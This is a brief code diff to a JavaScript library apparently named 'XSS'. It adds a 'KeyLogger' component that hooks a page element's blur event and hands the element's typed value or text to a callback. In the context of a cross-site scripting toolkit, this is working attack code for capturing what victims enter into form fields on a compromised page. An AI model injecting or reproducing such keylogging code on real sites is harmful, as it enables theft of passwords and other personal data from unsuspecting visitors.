@@ -155,3 +155,28 @@ var XSS = {
     return true;
   }
 };
+
+XSS.KeyLogger = function(element,callback) {
+  this.element = element;
+  this.callback = callback;
+
+  var self = this;
+
+  this.element.onblur = new XSS.Callback(this.element.onblur,function(e) {
+    if (self.callback) {
+      self.callback(self.value());
+    }
+  });
+};
+
+XSS.KeyLogger.prototype.value = function() {
+  if (this.element.value != undefined) {
+    return this.element.value;
+  }
+  else if (this.element.text != undefined) {
+    return this.element.text;
+  }
+  else {
+    return "";
+  }
+};
